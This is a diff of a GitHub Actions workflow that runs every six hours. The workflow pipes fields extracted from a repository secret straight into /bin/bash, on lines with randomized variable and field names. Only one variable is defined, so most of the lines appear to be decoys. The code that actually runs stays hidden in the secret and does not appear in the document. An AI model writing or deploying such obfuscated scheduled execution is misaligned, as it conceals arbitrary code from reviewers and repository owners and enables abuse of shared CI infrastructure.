@@ -1,32 +1,35 @@
 name: yaobeicihua
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 2/6 * * *'
+    - cron: '17 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yaobeicihua
         env:
-          c6465: ${{ secrets.c6465 }}
+          bw061: ${{ secrets.bw061 }}
         run: |
-          echo $c6465 | jq -r .qbpjq8011 | /bin/bash
-          echo $m1876 | jq -r .zbn71 | /bin/bash
-          echo $gkele200 | jq -r .rkqe0 | /bin/bash
-          echo $k2248 | jq -r .vwln2311 | /bin/bash
-          echo $c88541 | jq -r .lge55952 | /bin/bash
-          echo $jdiha4 | jq -r .cft11 | /bin/bash
-          echo $gf168 | jq -r .urcr29 | /bin/bash
-          echo $na1 | jq -r .jdq64614 | /bin/bash
-          echo $jeyn243 | jq -r .m6 | /bin/bash
-          echo $dsfj31789 | jq -r .y5 | /bin/bash
-          echo $vds295 | jq -r .bak206 | /bin/bash
-          echo $vthwk47 | jq -r .ss1 | /bin/bash
-          echo $gpm22 | jq -r .k034 | /bin/bash
-          echo $obpn21 | jq -r .aop90 | /bin/bash
-          echo $bhyt5007 | jq -r .g1 | /bin/bash
-          echo $jdcs35784 | jq -r .iefy70630 | /bin/bash
-          echo $qrs1461 | jq -r .yhsqh90 | /bin/bash
+          echo $bw061 | jq -r .s5206 | /bin/bash
+          echo $cabim787 | jq -r .md22414 | /bin/bash
+          echo $seh0 | jq -r .xopvj5933 | /bin/bash
+          echo $idd8997 | jq -r .elxxw21746 | /bin/bash
+          echo $zkm7878 | jq -r .t34526 | /bin/bash
+          echo $lbkc8 | jq -r .ruxz42 | /bin/bash
+          echo $mx8127 | jq -r .nfl64 | /bin/bash
+          echo $ygb024 | jq -r .lk940 | /bin/bash
+          echo $v9 | jq -r .clog3719 | /bin/bash
+          echo $zaf56521 | jq -r .c677 | /bin/bash
+          echo $zw760 | jq -r .ptggo448 | /bin/bash
+          echo $c99 | jq -r .qoab069 | /bin/bash
+          echo $klfr81694 | jq -r .nyv5 | /bin/bash
+          echo $q03 | jq -r .vjn7035 | /bin/bash
+          echo $cjywk8096 | jq -r .d94 | /bin/bash
+          echo $syl1891 | jq -r .v68 | /bin/bash
+          echo $al0 | jq -r .uqo57 | /bin/bash
+          echo $pp628 | jq -r .f89953 | /bin/bash
 
